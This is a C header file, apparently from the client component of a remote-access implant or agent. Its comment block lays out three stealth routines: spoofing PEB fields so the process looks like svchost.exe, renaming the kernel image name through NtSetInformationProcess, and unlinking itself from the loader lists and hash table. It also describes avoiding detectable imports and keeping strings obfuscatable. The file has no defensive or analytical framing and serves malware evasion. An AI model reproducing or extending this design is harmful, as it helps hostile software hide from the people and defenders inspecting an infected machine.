/*
 * client/spoof.h  –  Process-identity spoofing declarations
 * ===========================================================
 * Three user-mode evasion routines that disguise the agent as svchost.exe
 * to casual inspection.  All are no-ops on failure — the agent continues
 * running even if a spoof call is denied.
 *
 * All three functions are IAT-clean:
 *   GetModuleHandleA / GetProcAddress / __readgsqword / __readfsdword are
 *   NOT called.  ntdll is resolved via peb_get_module(); function pointers
 *   via peb_get_export(); the PEB via inline asm segment reads.
 *
 *  spoof_peb()
 *      Overwrites three PEB fields:
 *        ProcessParameters.ImagePathName — seen by Task Manager / ProcExp
 *        ProcessParameters.CommandLine   — command-line column
 *        peb->ImageBaseAddress           — base→name resolver in PH/ProcExp
 *      String buffers live in writable .data (not .rdata) so a runtime
 *      obfuscation pass can encode them without linker changes.
 *      PEB pointer is read via inline asm (no __readgsqword/__readfsdword).
 *
 *  spoof_kernel_image()
 *      Calls NtSetInformationProcess (resolved via PEB walk) with:
 *        Class 49 (ProcessImageFileName, Vista+)    — Win32-path form
 *        Class 74 (ProcessImageFileNameWin32, Win8.1+) — Win32-path form
 *      Both classes are attempted; failure of either is a silent no-op.
 *      No GetModuleHandleA / GetProcAddress in the call chain.
 *
 *  unlink_self_from_ldr()
 *      Removes the EXE's LDR_DATA_TABLE_ENTRY from the three PEB loader
 *      lists AND from the LdrpHashTable bucket chain so both list-walk and
 *      hash-table enumeration cannot find us.
 *        InLoadOrderModuleList       — always unlinked
 *        InMemoryOrderModuleList     — always unlinked
 *        InInitializationOrderList   — only on pre-Win8 (build < 9200)
 *        HashLinks (LdrpHashTable)   — always cleared
 *      Build number is read from PEB->OSBuildNumber (no RtlGetVersion call).
 *      Self-base from PEB->ImageBaseAddress (no GetModuleHandleA(NULL)).
 */

#pragma once
#ifndef CLIENT_SPOOF_H
#define CLIENT_SPOOF_H

#ifdef __cplusplus
extern "C" {
#endif

void spoof_peb(void);
void spoof_kernel_image(void);
void unlink_self_from_ldr(void);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SPOOF_H */
